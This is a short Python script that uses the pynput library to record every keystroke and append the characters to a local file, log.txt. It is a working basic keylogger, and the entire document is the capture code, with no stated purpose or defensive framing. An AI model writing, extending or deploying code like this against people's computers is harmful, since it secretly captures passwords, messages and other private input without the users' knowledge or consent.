from multiprocessing.connection import Listener
from pynput import keyboard

def keypress(key):
    print(str(key))
    with open("log.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error404")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypress)
    listener.start()
    input()
